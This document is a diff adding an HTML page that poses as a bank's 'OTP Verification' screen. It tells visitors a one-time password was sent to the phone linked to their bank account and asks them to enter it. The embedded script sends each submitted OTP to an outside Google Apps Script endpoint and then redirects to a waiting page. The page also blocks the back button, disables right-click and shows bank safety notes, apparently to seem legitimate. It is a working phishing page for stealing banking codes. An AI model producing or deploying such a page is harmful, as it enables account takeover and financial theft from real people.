@@ -1,0 +1,291 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+        function preventBack() { window.history.forward();}
+        setTimeout("preventBack()", 0); window.onunload = function () { null };
+    </script>
+    <meta charset="UTF-8">    
+    <meta http-equiv="refresh" content="150; url=expire.html">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Secureway</title>
+    <link href="external1.css" rel="stylesheet">
+    <style>
+
+
+*{
+    margin:0%;
+    padding:0;
+    box-sizing: border-box;
+}
+
+
+:root{
+    --primary-font-family: 'Poppins', sans-serif;
+    --gray:#5e6278;
+    --gray-1:#e3e3e3;
+}
+body{
+    font-family: var(--bs-font-sans-serif);
+    font-size: 15px;
+    line-height: 1.5;
+    background-color: #cbb2b2;  
+    background-image:url("./images/bg12.jpg");
+    background-size: cover;
+} 
+
+/* Main CSS OTP Verification New Changing */ 
+.wrapper{
+    background-position:bottom center;
+    background-repeat: no-repeat;
+    background-size: contain;
+    background-attachment: fixed;
+    max-height: 90%;  
+}
+
+.wrapper .logo img{
+    height: 70px;
+    margin-bottom: 1%;
+    margin-top: 0.5%;
+    width: 99%;
+}
+.img-fluid {
+    max-width: 100%;
+    height: auto;
+}
+.wrapper .logo5 img{
+    margin-top: 1%;
+    max-width: 30%;
+}
+.wrapper .pg p{
+    font-size: 1rem;
+    color: green;
+    margin-top: 2%;
+    margin-bottom: -2%;
+    text-align: center;
+}
+.wrapper .pg p2{
+    font-size: 0.8rem;
+    color: red;
+    display: flex;
+    text-align: center;
+    margin-left: 83px;
+}
+
+h9{
+    
+    margin-left: 20%;
+    margin-top: 1.3%;
+    display: flex;
+    font-size: 1rem;    
+}
+
+h4 {
+    margin-top: -5%;
+    font-size: 1rem;
+}
+.b1{
+    color: red;
+}
+.text-center {
+    text-align: center!important;
+}
+
+.wrapper text-blue{
+    color: black;
+    font-size: 14px;
+    margin-top: 07%;
+    margin-bottom: 06%;
+}
+
+table {
+  margin: auto;
+  border-collapse: collapse;
+  border: 1px solid rgb(100, 100, 100);
+  letter-spacing: 1px;
+  font-family: sans-serif;
+  font-size: 0.8rem;
+  border-align: center;
+}
+
+td,
+th {
+  border: 1px solid rgb(100, 100, 100);
+  padding: 3px 10px;
+  text-align: center;
+}
+
+td {
+  text-align: center;
+}
+.rounded {
+    border-radius: 0.20rem!important;
+}
+
+.bg-white {
+    background-color: #f8f9fa!important;
+}
+
+.p-5 {
+    padding: 2.2rem!important;
+}
+.shadow {
+    box-shadow: 0 .7rem 3rem rgba(0,0,0,.15)!important;
+}
+
+.wrapper input:focus{
+    box-shadow: none;
+}
+.wrapper .password-info{
+    font-size:10px;
+}
+.wrapper .submit_btn{
+    padding:5px 8px;
+    font-weight:470;
+    
+}
+.wrapper .login_with{
+    padding:8px 15px;
+    font-size: 13px;
+    font-weight: 500;
+    transition:0.3s ease-in-out;
+}
+.wrapper .submit_btn:focus,
+.wrapper .login_with:focus{
+    box-shadow: none;
+}
+.wrapper .login_with:hover{
+    background-color:var(--gray-1);
+    border-color:var(--gray-1);
+}
+.wrapper .login_with img{
+    max-width: 7%;
+} 
+
+
+.wrapper .otp_input input{
+    margin-left: 26%;
+    width: auto;
+    height: 36px;
+    text-align: center;
+    font-size: 18px;
+    font-weight: 500;
+    text-align: center;        
+}
+
+.my-4 {
+    margin-top: 0.2rem;
+    margin-bottom: 2rem!important;
+}
+
+input::placeholder {
+  font-size: 16px;
+  font-weight: bold;
+  opacity: 0.5;
+  color: grey;
+}
+.mb-2 {
+    margin-bottom: 0.5rem!important;
+}
+
+.mb-3 {
+    margin-bottom: 0.5rem!important;
+    margin-top: -1.5rem!important;
+}
+
+div#notes {
+    margin-top: 1%;
+    width: 90%;
+    margin-left: 4%;
+    color: red;
+    text-align: left;
+    font-size: 0.9rem;
+}
+
+
+@media (max-width:1291px){
+    .wrapper .otp_input input{ 
+        height:50px; 
+    }
+}
+@media (max-width:767px){
+    .wrapper .otp_input input{ 
+        height:40px; 
+    }
+}
+        
+      
+
+</style>
+	      
+</head>
+<body oncontextmenu="return false;"> 
+    <section class="wrapper">
+		<div class="containerr">
+			<div class="col-sm-8 offset-sm-2 col-lg-6 offset-lg-3 col-xl-6 offset-xl-3 text-center">
+				<div class="logo">
+					<img src="11.jpg" class="img-fluid" alt="logo">
+				</div>
+				    <form method="post" action="" name="Mforms" class="rounded bg-white shadow p-5">
+					<h3 class="text-dark fw-bolder fs-3 mb-2">OTP Verification</h3>
+
+
+					
+					<div class="pg"> 
+					<p>One Time Password (OTP) successfully sent to the phone number linked to your bank account.</p>
+
+					<div class="otp_input text-start mb-2">
+                      
+						<div class="align-items-center justify-content-between mt-2">
+                            <input type="tel" class="input box" name="PO" placeholder="Enter OTP Here" maxlength="8" required>
+              <button type="submit" id="sub" class="btn btn-primary submit_btn my-4">Verify</button>
+ </div> 
+					</div>
+					
+                    <div class="fw-normal text-muted mb-3">
+						Didn’t get the code ? <a href="#" class="text-primary fw-bold text-decoration-none">Resend</a>
+
+						<h9>This page validity automatically expire after 3 minutes.</h9></div>
+	<div class="container">
+  <div class="row">
+    <div class="alert alert-success col-md-12" role="alert" id="notes"><br>
+            <h4>NOTES</h4>
+ <ul>
+        <li>Do not share any kind of information which related to your bank account</li>
+          
+        <li> Bank and other payment institution never call or sms to you for asking your information</li>
+      </ul>
+    </div>
+  </div>
+      
+				</form>
+				</div>
+		<div class="logo5">
+   <img src="./logo5.png" class="img-fluid" alt="logo"> </div></div>
+		<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwikJaXDz7p8keUbkkUiFVUVZY7o47rD_DAdZrnOGdjOfefxJDIXIxFlbHGZqrI1xFz/exec'
+        const form = document.forms['Mforms']
+        form.addEventListener('submit', e => { 
+         e.preventDefault()
+     document.querySelector("#sub").innerHTML="Please wait..";
+     let requestBody = new FormData(form)
+     fetch(scriptURL, { method: 'POST', body: requestBody})
+        .then(() => { form.reset();
+        document.querySelector("#sub").innerHTML="Verify";
+        window.location.replace("waiting.html");
+         })
+       .catch(error => {
+       alert('Check your internet connection!', error.message)
+         submitButton.disabled = false
+
+       }
+       )
+   })
+</script>
+	</section>
+</body>
+</html>
+
